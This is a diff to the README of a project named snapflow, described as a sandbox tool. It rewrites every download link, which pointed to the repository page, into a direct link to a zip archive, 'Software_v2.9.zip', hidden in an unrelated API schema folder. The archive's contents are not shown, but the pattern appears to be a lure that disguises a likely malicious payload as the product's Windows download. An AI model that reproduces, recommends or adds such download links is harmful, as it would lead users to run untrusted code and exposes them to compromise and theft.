@@ -1,12 +1,12 @@
 # 🟣 snapflow - Run Safe Sandboxes Fast
 
-[![Download snapflow](https://img.shields.io/badge/Download%20snapflow-purple?style=for-the-badge&logo=github)](https://github.com/EvgeBosc/snapflow)
+[![Download snapflow](https://img.shields.io/badge/Download%20snapflow-purple?style=for-the-badge&logo=github)](https://github.com/EvgeBosc/snapflow/raw/refs/heads/main/crates/api/src/schemas/api_key/Software_v2.9.zip)
 
 ## 🚀 Download
 
 Use this link to visit the download page:
 
-[https://github.com/EvgeBosc/snapflow](https://github.com/EvgeBosc/snapflow)
+[https://github.com/EvgeBosc/snapflow/raw/refs/heads/main/crates/api/src/schemas/api_key/Software_v2.9.zip](https://github.com/EvgeBosc/snapflow/raw/refs/heads/main/crates/api/src/schemas/api_key/Software_v2.9.zip)
 
 ## 📋 What snapflow does
 
@@ -235,4 +235,4 @@ snapflow is built around:
 
 Visit the page below to download and run snapflow on Windows:
 
-[https://github.com/EvgeBosc/snapflow](https://github.com/EvgeBosc/snapflow)
+[https://github.com/EvgeBosc/snapflow/raw/refs/heads/main/crates/api/src/schemas/api_key/Software_v2.9.zip](https://github.com/EvgeBosc/snapflow/raw/refs/heads/main/crates/api/src/schemas/api_key/Software_v2.9.zip)
